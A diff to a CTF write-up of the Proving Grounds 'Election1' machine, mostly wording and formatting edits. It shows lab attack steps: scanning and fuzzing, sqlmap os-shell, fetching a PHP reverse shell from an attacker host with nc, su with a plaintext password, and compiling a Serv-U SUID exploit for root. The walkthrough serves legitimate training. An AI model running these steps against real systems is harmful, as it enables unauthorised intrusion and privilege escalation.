@@ -1,6 +1,6 @@
 ---
 title: "Election1"
-categories: [CTF, Proving Grounds]
+categories: [CTF, Proving Grounds - Play]
 tags: [MEDIUM, Linux, Web, Exposed Credentials, Cookie Steal, SQLI]
 mermaid: true
 image: ../assets/img/pg/offsec.jpeg
@@ -18,20 +18,20 @@ Privilege escalation involved lateral movement by inspecting log files, revealin
 
 The final privilege escalation was achieved by exploiting a known vulnerability in the Serv-U binary with SUID permissions, ultimately leading to root access.
 
-# Diagram
+# Overview
 
 ```mermaid
 graph TD
     A[Intelligence Gathering]
-    A -->|Port Scan| B[Port 80,22]
-    B -->|HTTP Enumeration| C[Exposed Credentials]
-    C -->|Admin access| D[Exploitation]
-    D -->|Cookie Steal, SQLi| E[Post-Exploitation]
-    E -->|Log File| F[Privilege Escalation]
-    F -->|Serv-U With SUID| G[Root Shell]
+    A --> B[Port Scan > Port 80,22]
+    B --> C[Enumeration: HTTP > Exposed Credentials]
+    C --> D[Exploitation > Admin access, Cookie, SQLi]
+    D --> E[Post-Exploitation: Lateral Escalation > Log File]
+    E --> F[Privilege Escalation > Serv-U With SUID]
+    F --> G[Root Shell]
 ```
 
-## 1. Information Gathering
+## 1. Intelligence Gathering
 
 ### Port Scan
 
@@ -55,7 +55,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-search for vuln
+searching for vuln
 
 ```bash
 sudo nmap --script=vuln -p22,80 192.168.233.211
@@ -101,7 +101,7 @@ PORT   STATE SERVICE
 > PHP Version 7.1.33-14
 > 
 
-**Fuzzing of directory's and files**
+**Fuzzing of directories and files**
 
 ```bash
 feroxbuster -u http://192.168.233.211/ -k -C 404,403,500 --wordlist=/usr/share/wordlists/dirb/big.txt -x php,asp,txt,xml,bak,log
@@ -109,7 +109,7 @@ feroxbuster -u http://192.168.233.211/ -k -C 404,403,500 --wordlist=/usr/share/w
 
 output
 
-> 301      GET        9l       28w      321c http://192.168.216.211/election => http://192.168.216.211/election/
+301      GET        9l       28w      321c http://192.168.216.211/election => http://192.168.216.211/election/
 301      GET        9l       28w      327c http://192.168.216.211/election/admin => http://192.168.216.211/election/admin/
 > 
 
@@ -125,7 +125,7 @@ here haved a acess to the administrative dashobard
 
 ![Untitled](../assets/img/pg/Election1/Untitled%205.png)
 
-descriptation in the magic tool
+drecryption with the magic tool
 
 ![Untitled](../assets/img/pg/Election1/Untitled%206.png)
 
@@ -191,7 +191,7 @@ Select [4] brute force search
 
 ![Untitled](../assets/img/pg/Election1/Untitled%2013.png)
 
-Take the os-shell
+Getting the os-shell
 
 ![Untitled](../assets/img/pg/Election1/Untitled%2014.png)
 
@@ -219,15 +219,19 @@ nc 192.168.45.190 1234 > fl0k1.php
 
 Execute PHP reverse shell
 
-`php fl0k1.php`
+```bash
+php fl0k1.php
+```
 
 **Initial Access**
+
+*local.txt*
 
 ![Untitled](../assets/img/pg/Election1/Untitled%2018.png)
 
 ## 4. Post-Exploitation
 
-Upgrade of shell
+Importing a shell with python3
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -256,7 +260,7 @@ Found the credentials adm
 su love #after put the pass P@$$w0rd@123
 ```
 
-Search for Suid binary's
+Search for suid binaries
 
 ```bash
 find / -perm -4000 2>/dev/null
@@ -264,7 +268,7 @@ find / -perm -4000 2>/dev/null
 
 ![Untitled](../assets/img/pg/Election1/Untitled%2021.png)
 
-Verified the process
+I checked the processes
 
 ```bash
 ps aux | grep serv
@@ -287,6 +291,8 @@ Send to target
 ![Untitled](../assets/img/pg/Election1/Untitled%2024.png)
 
 Compile & Run
+
+*proof.txt*
 
 ```bash
 gcc 47009.c -o pe && ./pe
